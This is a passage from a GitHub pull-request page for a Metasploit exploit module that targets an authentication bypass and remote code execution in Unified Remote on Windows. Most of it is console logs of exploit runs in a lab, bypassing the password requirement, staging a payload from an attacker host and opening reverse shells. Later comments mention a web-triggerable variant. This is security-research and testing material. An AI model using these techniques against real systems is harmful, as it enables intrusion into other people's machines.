10.0.0.81:9512 - Typing out payload [*] 10.0.0.81:9512 - Attempting to open payload [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [*] 10.0.0.81:9512 - Reverting security mode [*] 10.0.0.81:9512 - Uploading new server config [*] 10.0.0.81:9512 - Sleeping 5 seconds for server to restart [*] Encoded stage with x86/shikata_ga_nai [*] Sending encoded stage (267 bytes) to 10.0.0.81 [*] Command shell session 3 opened (10.0.0.1:4444 -> 10.0.0.81:51241) at 2022-09-21 13:55:20 +0200 [*] 10.0.0.81:9512 - Server stopped. [!] 10.0.0.81:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\cz4TFFcXcjRky6KM6.exe' on the target   Shell Banner: Microsoft Windows [Version 10.0.22000.856] -----   C:\Users\n00tmeg>ver ver  Microsoft Windows [Version 10.0.22000.856]  C:\Users\n00tmeg>exit exit  ```   Group authentication - visible false ``` msf6 exploit(windows/misc/unified_remote_rce) > exploit lhost=10.0.0.1 rhosts=10.0.0.81 verbose=true visible=false  [*] Started reverse TCP handler on 10.0.0.1:4444 [*] 10.0.0.81:9512 - Client name set to: android-c39NkUzx13S9npUY [*] 10.0.0.81:9512 - Retrieving server config [*] 10.0.0.81:9512 - anonymous mode enabled, password required, bypassing [*] 10.0.0.81:9512 - Uploading new server config [*] 10.0.0.81:9512 - Sleeping 5 seconds for server to restart [+] 10.0.0.81:9512 - Found account: admin [+] 10.0.0.81:9512 - Found account: msfuser [*] 10.0.0.81:9512 - Sending handshake [*] 10.0.0.81:9512 - Sending empty authentication [*] 10.0.0.81:9512 - Using URL: http://10.0.0.1:8080/ [*] 10.0.0.81:9512 - Loading Unified.Command [*] 10.0.0.81:9512 - Updating Unified.Command [*] 10.0.0.81:9512 - Sending payload [*] 10.0.0.81:9512 - Executing script [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [*] Encoded stage with x86/shikata_ga_nai [*] Sending encoded stage (267 bytes) to 10.0.0.81 [*] 10.0.0.81:9512 - Reverting security mode [*] 10.0.0.81:9512 - Uploading new server config [*] 10.0.0.81:9512 - Sleeping 5 seconds for server to restart [*] Command shell session 4 opened (10.0.0.1:4444 -> 10.0.0.81:51492) at 2022-09-21 13:56:34 +0200 [*] 10.0.0.81:9512 - Server stopped. [!] 10.0.0.81:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\dew14t1g0D82F8.exe' on the target   Shell Banner: Microsoft Windows [Version 10.0.22000.856] -----   C:\ProgramData\Unified Remote\Remotes\Bundled\Unified\Main\Command>ver ver  Microsoft Windows [Version 10.0.22000.856]  C:\ProgramData\Unified Remote\Remotes\Bundled\Unified\Main\Command>exit exit  ```   User authentication - visible true ``` msf6 exploit(windows/misc/unified_remote_rce) > exploit lhost=10.0.0.1 rhosts=10.0.0.81 verbose=true visible=true  [*] Started reverse TCP handler on 10.0.0.1:4444 [*] 10.0.0.81:9512 - Client name set to: android-ZKbbUwQMtpWfQ0Sp [*] 10.0.0.81:9512 - Retrieving server config [*] 10.0.0.81:9512 - users mode enabled, password required, bypassing [*] 10.0.0.81:9512 - Uploading new server config [*] 10.0.0.81:9512 - Sleeping 5 seconds for server to restart [+] 10.0.0.81:9512 - Found account: admin [+] 10.0.0.81:9512 - Found account: msfuser [*] 10.0.0.81:9512 - Sending handshake [*] 10.0.0.81:9512 - Sending empty authentication [*] 10.0.0.81:9512 - Using URL: http://10.0.0.1:8080/ [*] 10.0.0.81:9512 - Opening Start Menu [*] 10.0.0.81:9512 - Opening command prompt [*] 10.0.0.81:9512 - Typing out payload [*] 10.0.0.81:9512 - Attempting to open payload [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [*] 10.0.0.81:9512 - Reverting security mode [*] 10.0.0.81:9512 - Uploading new server config [*] 10.0.0.81:9512 - Sleeping 5 seconds for server to restart [*] Encoded stage with x86/shikata_ga_nai [*] Sending encoded stage (267 bytes) to 10.0.0.81 [*] Command shell session 5 opened (10.0.0.1:4444 -> 10.0.0.81:51750) at 2022-09-21 13:57:55 +0200 [*] 10.0.0.81:9512 - Server stopped. [!] 10.0.0.81:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\htrpsCR8Ye5VLd.exe' on the target   Shell Banner: Microsoft Windows [Version 10.0.22000.856] -----   C:\Users\n00tmeg>ver ver  Microsoft Windows [Version 10.0.22000.856]  C:\Users\n00tmeg>exit exit  ```   User authentication - visible false ``` msf6 exploit(windows/misc/unified_remote_rce) > exploit lhost=10.0.0.1 rhosts=10.0.0.81 verbose=true visible=false  [*] Started reverse TCP handler on 10.0.0.1:4444 [*] 10.0.0.81:9512 - Client name set to: android-B1xhVXeS4GuKVTI9 [*] 10.0.0.81:9512 - Retrieving server config [*] 10.0.0.81:9512 - users mode enabled, password required, bypassing [*] 10.0.0.81:9512 - Uploading new server config [*] 10.0.0.81:9512 - Sleeping 5 seconds for server to restart [+] 10.0.0.81:9512 - Found account: admin [+] 10.0.0.81:9512 - Found account: msfuser [*] 10.0.0.81:9512 - Sending handshake [*] 10.0.0.81:9512 - Sending empty authentication [*] 10.0.0.81:9512 - Using URL: http://10.0.0.1:8080/ [*] 10.0.0.81:9512 - Loading Unified.Command [*] 10.0.0.81:9512 - Updating Unified.Command [*] 10.0.0.81:9512 - Sending payload [*] 10.0.0.81:9512 - Executing script [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [*] Encoded stage with x86/shikata_ga_nai [*] Sending encoded stage (267 bytes) to 10.0.0.81 [*] 10.0.0.81:9512 - Reverting security mode [*] 10.0.0.81:9512 - Uploading new server config [*] 10.0.0.81:9512 - Sleeping 5 seconds for server to restart [*] Command shell session 6 opened (10.0.0.1:4444 -> 10.0.0.81:52012) at 2022-09-21 13:59:09 +0200 [*] 10.0.0.81:9512 - Server stopped. [!] 10.0.0.81:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\GHddShH1Ppzs8EZ8.exe' on the target   Shell Banner: Microsoft Windows [Version 10.0.22000.856] -----   C:\ProgramData\Unified Remote\Remotes\Bundled\Unified\Main\Command>ver ver  Microsoft Windows [Version 10.0.22000.856]  C:\ProgramData\Unified Remote\Remotes\Bundled\Unified\Main\Command>exit exit  ```   No authentication - no web server access - visible true ``` msf6 exploit(windows/misc/unified_remote_rce) > exploit lhost=10.0.0.1 rhosts=10.0.0.81 verbose=true visible=true  [*] Started reverse TCP handler on 10.0.0.1:4444 [*] 10.0.0.81:9512 - Client name set to: android-ogRbsUFX62J8iFdA [*] 10.0.0.81:9512 - Retrieving server config [-] 10.0.0.81:9512 - Web interface is disabled. Unable to attempt bypass, assuming no authentication. [*] 10.0.0.81:9512 - Sending handshake [*] 10.0.0.81:9512 - Sending empty authentication [*] 10.0.0.81:9512 - Using URL: http://10.0.0.1:8080/ [*] 10.0.0.81:9512 - Opening Start Menu [*] 10.0.0.81:9512 - Opening command prompt [*] 10.0.0.81:9512 - Typing out payload [*] 10.0.0.81:9512 - Attempting to open payload [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [+] 10.0.0.81:9512 - Payload request received, sending 73802 bytes of payload for staging [*] Encoded stage with x86/shikata_ga_nai [*] Sending encoded stage (267 bytes) to 10.0.0.81 [*] Command shell session 7 opened (10.0.0.1:4444 -> 10.0.0.81:52354) at 2022-09-21 14:00:56 +0200 [*] 10.0.0.81:9512 - Server stopped. [!] 10.0.0.81:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\3gr3nCxvVz.exe' on the target   Shell Banner: Microsoft Windows [Version 10.0.22000.856] -----   C:\Users\n00tmeg>ver ver  Microsoft Windows [Version 10.0.22000.856]  C:\Users\n00tmeg>exit exit  ```   User authentication - no web server access - visible true (should fail) ``` msf6 exploit(windows/misc/unified_remote_rce) > exploit lhost=10.0.0.1 rhosts=10.0.0.81 verbose=true visible=true  [*] Started reverse TCP handler on 10.0.0.1:4444 [*] 10.0.0.81:9512 - Client name set to: android-mFdZeFQQlIEC4tny [*] 10.0.0.81:9512 - Retrieving server config [-] 10.0.0.81:9512 - Web interface is disabled. Unable to attempt bypass, assuming no authentication. [*] 10.0.0.81:9512 - Sending handshake [*] 10.0.0.81:9512 - Sending empty authentication [*] 10.0.0.81:9512 - Using URL: http://10.0.0.1:8080/ [*] 10.0.0.81:9512 - Opening Start Menu [*] 10.0.0.81:9512 - Opening command prompt [*] 10.0.0.81:9512 - Typing out payload [*] 10.0.0.81:9512 - Attempting to open payload [*] 10.0.0.81:9512 - Server stopped. [!] 10.0.0.81:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\pVjiMsClA2.exe' on the target [*] Exploit completed, but no session was created.  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=40&u=742106a5d45f3f0b208d4e88badee1be8d6c4800&v=4)](/cdelafuente-r7)
[cdelafuente-r7](/cdelafuente-r7)
added
the
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
label
[Sep 21, 2022](#event-7430301834)

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=40&u=742106a5d45f3f0b208d4e88badee1be8d6c4800&v=4)](/cdelafuente-r7)
[cdelafuente-r7](/cdelafuente-r7)
merged commit [`4943d86`](/rapid7/metasploit-framework/commit/4943d86ec619f9c7073c5fb4cd120933c00900d3)
into
rapid7:master

[Sep 21, 2022](https://github.com/rapid7/metasploit-framework/pull/16989#event-7430307510)

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=80&u=742106a5d45f3f0b208d4e88badee1be8d6c4800&v=4)](/cdelafuente-r7)

Copy link

Contributor

### **[cdelafuente-r7](/cdelafuente-r7)** commented [Sep 21, 2022](#issuecomment-1253623131)

| Release Notes This adds an exploit module to exploit an authentication bypass to achieve remote code execution in Unified Remote on Windows. Note that the latest version (3.11.0.2483) is vulnerable, which make it a 0-Day. |
| --- |

All reactions

Sorry, something went wrong.

 [![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
deleted the
unified\_remote

branch
[September 21, 2022 19:20](#event-7433685093)

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [Feb 6, 2023](#issuecomment-1419896439)

| FWIW, just published this [CVE](https://www.cve.org/cverecord?id=CVE-2022-3229). Sorry for the delay. |
| --- |

All reactions

Sorry, something went wrong.

[![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=80&u=c6b4ec16ff148947f8ee8cb17ef0f6b2bbd6aadb&v=4)](/H4rk3nz0)

Copy link

### **[H4rk3nz0](/H4rk3nz0)** commented [Feb 6, 2023](#issuecomment-1419908440) • edited Loading

| Not a problem, I just got the Web Triggerable RCE working. In theory any Unified Remote user that visits a web page\* with the right JS could get popped. |
| --- |

All reactions

Sorry, something went wrong.

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
reviewed
[Mar 28, 2023](#pullrequestreview-1361325593)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16989/files/9e6c172dd449f25333fe9dff069026b39a7c1a82)

[documentation/modules/exploit/windows/misc/unified\_remote\_rce.md](/rapid7/metasploit-framework/pull/16989/files/9e6c172dd449f25333fe9dff069026b39a7c1a82#diff-3113d821b13e0e21947e768098ad80f002d21931691e5ce8f0096eb5308cded4)

|  |  |  |
| --- | --- | --- |
|  |  | ### PATH |
|  |  |  |
|  |  | This ONLY applies to the pull method. Where to temporarily store the payload. Defaults to `c:\\Windows\\Temp\\` |

Copy link

Contributor

### @bcoles **[bcoles](/bcoles)** [Mar 28, 2023](#discussion_r1150769069)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

What alternatives are there to "the pull method" ?

`pull` is not mentioned or documented anywhere else, with the exception of the module `target` which states "pull".

Sorry, something went wrong.

All reactions

[modules/exploits/windows/misc/unified\_remote\_rce.rb](/rapid7/metasploit-framework/pull/16989/files/9e6c172dd449f25333fe9dff069026b39a7c1a82#diff-36de1eb4db0be8601b9f08557b8add6cf522a8b14f93bf59aee7eb83ca1dc547)

|  |  | 'Platform' => 'win', |
| --- | --- | --- |
|  |  | 'Stance' => Msf::Exploit::Stance::Aggressive, |
|  |  | 'Targets' => [ |
|  |  | ['pull', {}], |

Copy link

Contributor

### @bcoles **[bcoles](/bcoles)** [Mar 28, 2023](#discussion_r1150769731)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

?

Sorry, something went wrong.

All reactions

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
mentioned this pull request
[Apr 16, 2023](#ref-pullrequest-1669986381)

[fix unified\_remote\_rce docs
#17892](/rapid7/metasploit-framework/pull/17892)
 Merged

[![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=80&u=c6b4ec16ff148947f8ee8cb17ef0f6b2bbd6aadb&v=4)](/H4rk3nz0)

Copy link

### **[H4rk3nz0](/H4rk3nz0)** commented [Jun 15, 2023](#issuecomment-1593762638)

| The latest version of the software by default does not listen on all interfaces to prevent network hosts from connecting to the web server enabled system. There is a workaround to achieve code execution through improper CORS permissions.  The vector is zip file upload to the local web server when a user visits a controlled malicious web page/link. This being triggered through an XHR request.  If there is any interest in adding this as a module or extension to this module feel free: [Unified Remote - CORS / Web Triggerable RCE](https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/unified%20remote/unified-remote-web-triggerable-rce.py) |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Jun 16, 2023](#issuecomment-1594450910)

| you can make a module suggestion issue with that information |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16989)

Reviewers

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=40&v=4)](/cdelafuente-r7) [cdelafuente-r7](/cdelafuente-r7)

cdelafuente-r7 left review comments

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=40&v=4)](/bcoles) [bcoles](/bcoles)

bcoles left review comments

Assignees

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=40&v=4)](/cdelafuente-r7) [cdelafuente-r7](/cdelafuente-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

[Metasploit Kanban](/orgs/rapid7/projects/17)

Archived in project

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

6 participants

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=52&v=4)](/h00die) [![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=52&v=4)](/H4rk3nz0) [![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=52&v=4)](/todb-r7) [![@mkienow-r7](https://avatars.githubusercontent.com/u/33330829?s=52&v=4)](/mkienow-r7) [![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=52&v=4)](/cdelafuente-r7) [![@bcoles](https://avatars.githubusercontent.com/u/434827?s=52&v=4)](/bcoles)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


